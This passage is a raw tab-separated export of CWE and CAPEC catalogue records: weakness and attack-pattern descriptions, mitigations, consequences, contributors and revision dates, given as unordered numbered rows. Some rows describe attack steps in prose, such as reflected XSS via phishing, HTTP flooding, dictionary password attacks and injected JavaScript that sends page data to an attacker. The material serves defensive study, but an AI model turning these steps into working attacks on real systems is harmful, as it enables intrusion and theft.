constructing SQL query strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.                   Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name "O'Reilly" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.                   When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.
14531	39	2008-08-15
8989	39	2019-01-03
14167	35	MITRE
14283	63	DoS: Crash, Exit, or Restart
14202	42	Developers should anticipate that inter-expression and inter-command delimiters will be injected/removed/manipulated in the input vectors of their software system.
20066	50	Design: Configure the access control correctly.
13665	39	2008-07-01
23433	39	2010-06-21
16424	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings, Type, Weakness_Ordinalities
11479	104	208
6672	39	2009-10-29
15450	43	Simple
12793	28	CWE Content Team
21787	63	Varies by Context
11790	21	CLASP
17258	85	310
17405	46	An attacker can supply a pointer for memory locations that the program is not expecting. If the pointer is dereferenced for a write operation, the attack might allow modification of critical program state variables, cause a crash, or execute code. If the dereferencing operation is for a read, then the attack might allow reading of sensitive data, cause a crash, or set a program variable to an unexpected value (since the value will be read from an unexpected memory location).             There are several variants of this weakness, including but not necessarily limited to:                                                The untrusted value is directly invoked as a function call.                   In OS kernels or drivers where there is a boundary between "userland" and privileged memory spaces, an untrusted pointer might enter through an API or system call (see CWE-781 for one such example).                   Inadvertently accepting the value from an untrusted control sphere when it did not have to be accepted as input at all. This might occur when the code was originally developed to be run by a single user in a non-networked environment, and the code is then ported to or otherwise exposed to a networked environment.
9689	35	MITRE
18553	40	Access to targeted system, resources, and information.
6148	67	High
23174	56	ChildOf
16939	28	CWE Content Team
8963	39	2011-06-01
19643	35	MITRE
22130	39	2008-07-01
12429	66	Exploiting Common Flaws in Drivers
7563	62	updated Common_Consequences
17332	35	MITRE
6693	35	MITRE
20816	39	2009-07-27
12638	28	CWE Content Team
19754	35	MITRE
17693	39	2017-11-08
12149	42	Adhere to the principle of complete mediation.
10724	44	High
18365	73	An attacker gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connections from it, attempting to gain the same privileges as a trusted system.
7976	56	ChildOf
15676	81	Availability
23859	62	updated Applicable_Platforms, Observed_Examples, Relationships, Relevant_Properties, Taxonomy_Mappings
6691	69	Draft
19202	26	Architecture and Design
24364	72	Injected code can access resources that the attacker is directly prevented from accessing.
14497	74	1
18420	62	updated Description
16974	39	2008-09-08
15478	72	If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.
6894	35	MITRE
5678	56	ChildOf
14745	23	Weaknesses in this attack-focused category do not properly filter and interpret special elements in user-controlled input which could cause adverse effect on the software behavior and integrity.
12464	39	2018-03-27
12108	81	Integrity
17389	39	2009-05-27
16653	28	CWE Content Team
22953	35	MITRE
9564	28	CWE Content Team
18482	39	2009-05-27
11814	35	MITRE
20170	62	updated Relationships
6931	39	2008-09-08
7792	35	MITRE
5930	76	2017-05-01
15752	100	The MITRE Corporation
23503	77	Manual Static Analysis - Source Code
7557	45	Base
20542	62	updated Affected_Resources, Applicable_Platforms, Causal_Nature, Common_Consequences, Functional_Areas, Likelihood_of_Exploit, Modes_of_Introduction, Relationships, Taxonomy_Mappings
16791	39	2009-12-28
6414	39	2011-03-29
23151	39	2017-11-08
10044	28	CWE Content Team
17407	43	Simple
13725	40	An adversary must be able install a purpose built malicious application onto the trusted user's system and convince the user to execute it while authenticated to the SaaS application.
24404	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
16380	62	updated Relationships
19992	62	updated Potential_Mitigations
22310	25	High
12217	63	Unexpected State
15713	28	CWE Content Team
19591	35	MITRE
5622	31	1000
7005	35	MITRE
7891	56	ChildOf
20220	73	Register the BitSquatted domain.
21286	39	2008-07-01
12629	89	Detailed
12673	81	Availability
10068	39	2008-07-01
15953	63	Varies by Context
14835	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
21628	39	2010-02-16
15063	83	Volume: 7, Issue. 51
20849	35	MITRE
13147	35	Cigital
7763	80	Creating malicious Flash or Applet to open a cross-domain socket connection to a remote system
11674	25	High
12328	23	Exposing system data or debugging information helps an adversary learn about the system and form an attack plan.
5843	23	The software contains an empty synchronized block.
19802	45	Base
8840	35	MITRE
25275	39	2011-06-01
12226	51	2015-11-09
17796	39	2012-05-11
10593	28	CWE Content Team
5840	103	Primary
19342	101	CAPEC Content Team
20211	39	2008-09-08
10133	35	MITRE
21033	33	Dan Tsafrir
24047	26	Architecture and Design
21924	52	Black box methods might not get the needed code coverage within limited time constraints, and a dynamic test might not produce any noticeable side effects even if it is successful.
15727	79	Availability
8766	35	MITRE
20961	39	2008-09-08
23272	28	CWE Content Team
21434	62	updated Causal_Nature, References, Relationships, Taxonomy_Mappings
20419	35	MITRE
18725	103	Primary
9668	39	2008-11-24
22891	62	updated Potential_Mitigations
19123	61	Draft
25139	39	2008-09-08
7445	43	Simple
14003	31	699
15322	22	01
19044	83	2007
22328	50	The use of HMAC to hash the response from the server can also be used to thwart reflection. The server responds by returning its own challenge as well as hashing the client's challenge, its own challenge and the pre-shared secret. Requiring the client to respond with the HMAC of the two challenges ensures that only the possessor of a valid pre-shared secret can successfully hash in the two values.
25301	62	updated Potential_Mitigations, Time_of_Introduction
21616	39	2010-06-21
24816	28	CWE Content Team
24457	23	An ActiveX control is intended for use in a web browser, but it exposes dangerous methods that perform actions that are outside of the browser's security model (e.g. the zone or domain).
18738	63	Reduce Reliability
9754	79	Authorization
18137	61	Draft
19355	28	CWE Content Team
12571	43	Simple
24498	39	2008-11-24
17748	62	updated Type
22942	63	Varies by Context
18238	39	2011-06-01
8688	35	MITRE
12181	42	Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.                   This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.
6597	56	ChildOf
10616	21	CWE Content Team
13655	30	Shaun Clowes
6599	63	Gain Privileges or Assume Identity
10343	81	Confidentiality
20945	39	2017-11-08
24645	28	CWE Content Team
6006	28	Sean Eidemiller
22043	104	425
12779	103	Primary
12363	86	http://www.net-security.org/dl/insecure/INSECURE-Mag-18.pdf
15813	100	The MITRE Corporation
11087	42	Use other means of identity verification that cannot be simply spoofed. Possibilities include a username/password or certificate.
13386	35	MITRE
23881	57	Primary
11166	35	MITRE
24065	47	Bypass Protection Mechanism
24037	100	The MITRE Corporation
16100	56	CanAlsoBe
20719	24	MITRE
10510	28	CWE Content Team
11817	35	MITRE
9764	63	Execute Unauthorized Code or Commands
17493	72	Not controlling memory allocation can result in a request for too much system memory, possibly leading to a crash of the application due to out-of-memory conditions, or the consumption of a large amount of memory on the system.
12949	62	updated Other_Notes, Relationship_Notes
8995	40	Advanced knowledge of internal software and hardware components within manufacturer's development environment.
19312	74	4
9089	91	Architecture and Design
8180	62	updated Relationships
24129	42	Refactor your program so that you do not have to dynamically generate code.
18355	39	2010-02-16
22521	28	CWE Content Team
13901	100	The MITRE Corporation
12296	23	An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.
6293	35	KDM Analytics
10799	62	updated Relationships
5811	28	CWE Content Team
22799	35	Cigital
24925	91	Implementation
7622	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
17683	50	Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data.
14330	79	Confidentiality
6274	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
12942	28	CWE Content Team
10803	28	CWE Content Team
20505	62	updated Potential_Mitigations, Time_of_Introduction
19508	35	MITRE
24726	45	Variant
25432	31	699
23670	39	2017-11-08
22147	100	The MITRE Corporation
24671	28	CWE Content Team
17627	28	CWE Content Team
25310	21	CWE Content Team
18951	23	An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is blindly attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality.
13509	81	Availability
22628	31	1000
23195	39	2017-11-08
13167	31	1000
23458	63	Modify Application Data
9870	35	MITRE
25294	35	MITRE
7444	31	1000
22770	26	Architecture and Design
20133	39	2008-09-08
12508	79	Access Control
11991	69	Draft
11864	63	Other
13747	35	MITRE
8994	103	Primary
20302	62	updated Common_Consequences, Relationships
15350	28	CWE Content Team
14717	62	updated Demonstrative_Examples
9209	104	432
5624	97	Wi-Fi Jamming
22744	78	High
16964	28	CWE Content Team
9454	50	Design: Ensure that terminals are only writeable by named owner user and/or administrator
13536	28	CWE Content Team
9376	74	3
5833	35	MITRE
14415	26	Architecture and Design
21251	59	Updated Related_Attack_Patterns
25259	31	1000
10496	73	Modify logical parts of cookie and send it back to server to observe the effects.
14876	53	The MITRE Corporation
22584	63	Varies by Context
10767	28	CWE Content Team
24932	91	Implementation
10904	28	CWE Content Team
13153	62	updated Relationships
19508	62	updated Observed_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
9471	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
22734	47	Modify Data
17411	33	Mattia Monga
20934	26	Implementation
7758	35	Veracode
19044	70	OWASP Top 10
21457	39	2008-11-24
22057	50	Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.
9300	28	CWE Content Team
5693	35	MITRE
16413	35	MITRE
9713	35	MITRE
17636	28	Eric Dalci
6600	88	Hidden Functionality
18612	23	The application stores sensitive information in cleartext in the registry.
21889	94	The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.
17707	21	PLOVER
16612	39	2011-06-27
5838	104	245
22186	101	CAPEC Content Team
5839	62	updated Demonstrative_Examples, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
7290	28	CWE Content Team
13874	26	Architecture and Design
24378	81	Availability
20929	39	2012-05-11
7374	35	MITRE
21378	62	updated Detection_Factors, Relationships
25264	81	Other
25089	28	CWE Content Team
8039	79	Confidentiality
9956	103	Primary
6341	63	Execute Unauthorized Code or Commands
10365	62	updated Relationships
18096	104	1045
24520	56	ChildOf
12405	62	updated Common_Consequences
10626	35	MITRE
21210	91	Architecture and Design
7854	63	Varies by Context
6814	39	2017-01-19
20393	39	2012-05-11
17733	97	UDP Flood
24591	23	The software contains a function, subroutine, or method whose signature has an unnecessarily large number of      parameters/arguments.
10225	73	Look for signs of well-known character encodings
16345	28	CWE Content Team
15621	79	Availability
18040	103	Primary
10733	39	2011-06-01
23496	35	MITRE
16671	63	Bypass Protection Mechanism
20774	81	Integrity
18884	28	CWE Content Team
8616	81	Non-Repudiation
15776	27	A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..
20396	45	Base
20801	101	CAPEC Content Team
16903	28	CWE Content Team
21995	35	MITRE
16030	63	Modify Application Data
18894	35	MITRE
24420	35	MITRE
12904	62	updated Relationships
6386	35	MITRE
21540	23	This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is "reflected" off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application. The most common method of this is through a phishing email where the adversary embeds the malicious script with a URL that the victim then clicks on. In processing the subsequent request, the vulnerable web application incorrectly considers the malicious script as valid input and uses it to creates a reposnse that is then sent back to the victim. To launch a successful Reflected XSS attack, an adversary looks for places where user-input is used directly in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.
11438	28	CWE Content Team
20603	62	updated Relationships, Taxonomy_Mappings
14778	62	updated Relationships, Taxonomy_Mappings
7915	35	MITRE
20105	28	CWE Content Team
13302	35	MITRE
22446	28	CWE Content Team
8900	28	CWE Content Team
23107	28	CWE Content Team
23634	62	updated Related_Attack_Patterns
7006	39	2011-06-01
22841	43	Simple
6825	92	Explore
16453	35	MITRE
19992	35	MITRE
13090	91	Operation
17370	44	SOAR Partial
9570	62	updated Relationships, Taxonomy_Mappings
21509	35	MITRE
13441	28	Eric Dalci
19393	95	[Execute JavaScript in victim's browser] When the attacker targets the current flash application, he can choose to inject JavaScript in the client's DOM and therefore execute cross-site scripting attack.
10245	62	updated Related_Attack_Patterns
11711	25	Medium
8638	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
23867	26	Architecture and Design
21184	28	CWE Content Team
14723	81	Other
13881	103	Primary
24498	35	MITRE
13069	35	MITRE
20223	28	CWE Content Team
24597	100	The MITRE Corporation
19114	62	updated Potential_Mitigations
10648	28	CWE Content Team
13821	31	1000
21749	44	High
20719	96	2017-08-01
9939	62	added/updated demonstrative examples
15766	66	Code Signing Guide
21108	73	Execute a stored XSS attack on a website to permanently embed the malicious link into the website.
20616	28	CWE Content Team
10715	50	Perform input validation for all content.
20355	26	Implementation
18722	43	Simple
15402	61	Draft
14508	69	Incomplete
17532	76	2015-11-09
12563	39	2011-06-01
19135	28	CWE Content Team
21333	31	699
20013	23	The software uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities.
7634	22	07
24491	39	2009-10-29
22256	23	An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.
8891	69	Incomplete
8997	40	The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.
13512	74	4
19268	28	CWE Content Team
13664	31	699
22447	43	Simple
10331	32	ForumSystems
16755	26	Implementation
12235	39	2009-03-10
22499	39	2012-05-11
15045	50	Monitor system and domain logs for abnormal access.
17716	28	CWE Content Team
13039	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
16597	70	Location Leaks on the GSM Air Interface
17936	28	CWE Content Team
15283	50	Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.
10967	39	2008-07-01
12597	81	Access Control
19727	28	CWE Content Team
20895	35	MITRE
13402	25	Low
23208	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.
15273	39	2019-01-03
18654	39	2014-06-23
19225	42	Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server.
11086	30	Irene Lobo Valbuena
17683	50	Use synchronization to control the flow of execution.
19400	59	Updated Attack_Motivation-Consequences
18459	62	updated Relationships
14505	80	To distribute email
18216	46	This issue can prevent the software from running reliably, e.g. if it runs in an environment does not use the hard-coded network resource identifiers. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
10758	39	2019-09-19
11824	28	Eric Dalci
18615	62	updated Description, Observed_Examples, Other_Notes, Research_Gaps
15373	39	2017-11-08
9592	28	CWE Content Team
9913	28	CWE Content Team
14872	54	Low
23449	35	Cigital
20504	25	Low
19212	62	updated References, Relationships
9271	25	High
15896	35	MITRE
15523	39	2009-01-12
10104	28	CWE Content Team
12810	28	Sean Eidemiller
22721	44	High
15178	28	CWE Content Team
10246	39	2011-06-27
22790	21	PLOVER
14583	28	Eric Dalci
12371	35	MITRE
14056	97	TCP RST Injection
18111	39	2010-02-16
19650	90	Language-Independent
21160	88	Uncaught Exception in Servlet
19395	90	Language-Independent
25245	26	Implementation
23021	88	Predictability Problems
12728	74	1
13207	45	Base
16981	74	1
23634	28	CWE Content Team
16869	39	2017-11-08
24363	62	updated Common_Consequences
15379	85	418
7368	72	If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator.
12133	101	CAPEC Content Team
16385	51	2014-06-23
11940	28	CWE Content Team
6496	28	Eric Dalci
21864	76	2017-01-09
22274	32	ACM
24685	28	CWE Content Team
10349	39	2014-06-23
9678	97	Counterfeit Hardware Component Inserted During Product Assembly
11010	35	MITRE
18841	50	Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.
17565	87	Web Server
21567	76	2017-08-04
19374	31	699
10580	59	Updated Related_Attack_Patterns
17893	28	CWE Content Team
7636	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
13012	62	updated Potential_Mitigations
5733	69	Draft
19507	28	CWE Content Team
6054	62	updated Demonstrative_Examples
12885	81	Integrity
16088	56	ChildOf
7866	100	The MITRE Corporation
19624	47	Gain Privileges
19073	26	Implementation
16662	69	Incomplete
15708	59	Updated Related_Weaknesses
19107	51	2014-06-23
11868	44	SOAR Partial
22980	39	2011-06-27
24558	31	699
19453	51	2014-06-23
14127	48	09
11021	51	2015-11-09
24859	39	2010-12-13
6619	91	Requirements
18379	31	699
16383	62	updated Relationships, Taxonomy_Mappings
18933	28	CWE Content Team
20403	28	CWE Content Team
12917	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
12503	56	ChildOf
18910	39	2011-06-27
15805	28	CWE Content Team
10134	39	2017-11-08
17159	69	Incomplete
5855	28	Sean Eidemiller
9677	35	MITRE
21934	79	Confidentiality
13190	39	2019-01-03
6362	39	2017-11-08
10898	35	MITRE
22030	28	CWE Content Team
11449	24	MITRE
16918	81	Confidentiality
15348	35	Cigital
21670	62	updated Potential_Mitigations
6523	63	Other
9880	28	Eric Dalci
23560	66	Secure Software Updates: Disappointments and New Challenges
18855	28	CWE Content Team
22040	23	Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support <script> tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.
14220	35	MITRE
20869	56	ChildOf
12146	39	2009-07-27
10205	104	298
14760	28	CWE Content Team
17096	54	High
20674	56	ChildOf
12119	28	CWE Content Team
20227	62	updated Applicable_Platforms
24768	28	CWE Content Team
6185	35	MITRE
6608	50	Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
9406	62	updated Relationships
17081	62	updated Relationships
8927	36	http://www.securityfocus.com/archive/1/393696
11362	100	The MITRE Corporation
18635	31	1000
18013	31	1000
8755	62	updated Potential_Mitigations
17929	26	Implementation
21974	39	2012-05-11
24654	62	updated Affected_Resources, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
12120	85	100
22008	79	Confidentiality
7939	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
23662	94	Information Leakage
12599	62	updated Relationships
18071	39	2008-10-14
20022	101	CAPEC Content Team
7533	31	1000
22069	63	Modify Files or Directories
14776	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
23951	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
17928	69	Draft
18172	63	Read Application Data
19532	39	2015-12-07
24033	74	1
11924	62	updated Relationships, Other_Notes, Taxonomy_Mappings
19867	31	699
12980	28	CWE Content Team
23927	103	Primary
21985	28	CWE Content Team
17602	33	John McDonald
21428	35	MITRE
6697	23	The software sets a pointer to a specific address other than NULL or 0.
13992	97	Password Brute Forcing
12957	62	updated Relationships
12759	62	updated Demonstrative_Examples
22373	39	2009-10-29
10967	62	added/updated demonstrative examples
18788	85	589
15883	39	2017-11-08
10863	28	CWE Content Team
11704	31	1000
11956	69	Draft
12448	28	CWE Content Team
11991	90	C++
21390	91	Implementation
14631	28	CWE Content Team
19629	26	Implementation
5631	28	KDM Analytics
20017	39	2011-06-01
8254	56	CanPrecede
10197	28	CWE Content Team
22190	35	MITRE
11499	78	Very High
17890	62	updated Taxonomy_Mappings
7321	28	CWE Content Team
16697	97	Resource Injection
12675	62	updated Observed_Examples
9121	55	CAPEC Content Team
12373	63	Gain Privileges or Assume Identity
14622	103	Primary
19703	63	Other
14460	39	2017-11-08
14846	62	updated Common_Consequences
14772	28	CWE Content Team
23866	23	An adversary exploits a weakness in authorization and installs a new root certificate on a compromised system. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.
19631	62	updated Potential_Mitigations
22300	21	PLOVER
17749	53	The MITRE Corporation
18491	35	MITRE
17497	28	CWE Content Team
10205	88	Improper Validation of Certificate Expiration
11104	81	Confidentiality
10285	31	700
25380	62	updated Common_Consequences
19519	25	Low
23425	44	High
12223	73	Examine any available documentation for the application that discusses expected XML input.
10183	62	updated Relationships
10173	104	925
20777	56	ChildOf
18701	56	ChildOf
15820	31	1000
7345	39	2012-05-11
19781	62	updated Relationships
16607	63	Execute Unauthorized Code or Commands
16944	56	ChildOf
12772	42	Make sensitive open/close operation non reachable by directly user-controlled data (e.g. open/close resources)
17783	62	updated Relationships
5732	39	2011-06-27
6599	81	Integrity
13415	43	Simple
11402	39	2014-07-30
16797	45	Class
21165	35	MITRE
14464	31	699
17417	31	1000
20869	103	Primary
16332	77	Automated Static Analysis - Source Code
17771	85	556
10922	102	ChildOf
14002	23	An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the destination of various application interface elements.
21334	62	updated Related_Attack_Patterns
7493	39	2008-08-01
20274	62	updated Description
25174	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.
13222	91	Implementation
11882	43	Simple
12967	59	Updated Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations
13359	44	SOAR Partial
6554	35	MITRE
6600	45	Class
14572	37	3.4.1
21259	43	Simple
19813	53	The MITRE Corporation
6976	35	MITRE
8710	28	CWE Content Team
19939	73	Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.
15450	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize "/../" sequences that can resolve to a location that is outside of that directory.
17000	35	MITRE
24188	35	MITRE
14677	43	Simple
21963	81	Availability
5916	26	Implementation
11010	62	updated Relationships
12246	101	CAPEC Content Team
10701	23	A parent class contains one or more child classes, but the parent class does not have a virtual destructor method.
11834	103	Primary
24798	45	Variant
21900	28	CWE Content Team
18951	61	Draft
15176	35	MITRE
11780	101	CAPEC Content Team
20700	88	Exposure of Core Dump File to an Unauthorized Control Sphere
22100	26	Architecture and Design
13784	28	CWE Content Team
24883	44	High
16100	31	1000
14217	39	2011-06-01
25354	62	updated References, Relationships
13297	39	2014-06-23
24332	23	The software does not validate, or incorrectly validates, a certificate.
14994	39	2012-05-11
6193	35	MITRE
10727	35	MITRE
24285	62	updated Demonstrative_Examples
12216	28	CWE Content Team
16523	28	CWE Content Team
24917	30	Dan Boneh
19749	90	Perl
5959	56	ChildOf
11297	91	Implementation
24133	45	Base
19864	91	Architecture and Design
17993	62	updated Relationships, Other_Notes, Taxonomy_Mappings
13612	73	Use a browser to manually explore the website and analyze how the flash file receive variables, e.g. JavaScript using SetVariable/GetVariable, HTML FlashVars param tag, etc.
17301	28	CWE Content Team
5927	30	David Molnar
11273	81	Confidentiality
14868	35	MITRE
18352	39	2011-03-29
19701	28	CWE Content Team
5896	39	2013-02-21
8091	62	updated Potential_Mitigations, Time_of_Introduction
10666	39	2008-07-01
23158	26	Operation
12290	39	2014-07-30
19098	101	CAPEC Content Team
19965	35	MITRE
25356	39	2019-01-03
22286	89	Detailed
25243	62	updated Relationships
7338	45	Base
18275	28	CWE Content Team
17622	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
14615	76	2019-09-30
18185	39	2009-05-27
24091	28	CWE Content Team
17994	26	Architecture and Design
20308	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Observed_Examples
24691	39	2012-10-30
18616	63	Unexpected State
10867	67	Low
23184	90	Language-Independent
14322	46	Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.             A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.             In either case, the end result is that a resource has been exposed to the wrong party.
12720	23	The software establishes a communication channel to (or from) an endpoint for privileged or protected operations, but it does not properly ensure that it is communicating with the correct endpoint.
21326	28	CWE Content Team
23517	31	699
19192	86	http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet
7625	56	ChildOf
21487	45	Variant
22868	35	MITRE
15402	23	Winlogon is a part of Windows that performs logon actions. In Windows systems prior to Windows Vista, a registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup.
19624	79	Availability
20453	42	Web applications should also not throw any Throwables to the application server as this may adversely affect the container.
23887	31	699
7468	28	CWE Content Team
14387	43	Simple
19833	62	updated Common_Consequences, Demonstrative_Examples, Relationships, Taxonomy_Mappings
13558	31	1000
22249	35	MITRE
6891	39	2009-10-29
21653	39	2010-04-05
21149	62	updated Common_Consequences
8185	95	The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner.
20531	26	Implementation
12868	39	2008-07-01
8395	35	MITRE
8151	28	CWE Content Team
14579	33	Fortify Software
6459	62	updated Description
16614	103	Primary
12339	46	Often times data-structure sentinels are used to mark structure of the data structure. A common example of this is the null character at the end of strings. Another common example is linked lists which may contain a sentinel to mark the end of the list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the deletion or modification outside of some wrapper interface which provides safety.
7961	39	2014-07-30
22206	39	2011-06-27
17388	57	Indirect
21918	28	CWE Content Team
14467	90	Language-Independent
13951	62	updated Observed_Examples
23562	44	High
7538	62	updated Potential_Mitigations
10026	78	High
8482	23	The software's architecture contains too many - or too few -      horizontal layers.
20160	81	Availability
24331	42	Use a language that provides appropriate memory abstractions.
11820	35	MITRE
19527	63	Gain Privileges or Assume Identity
21114	62	updated Potential_Mitigations, Time_of_Introduction
7393	69	Draft
10084	23	The software does not initialize critical variables, which causes the execution environment to use unexpected values.
10748	39	2014-02-18
13188	39	2012-10-30
10482	90	Language-Independent
16524	39	2010-06-21
9933	35	MITRE
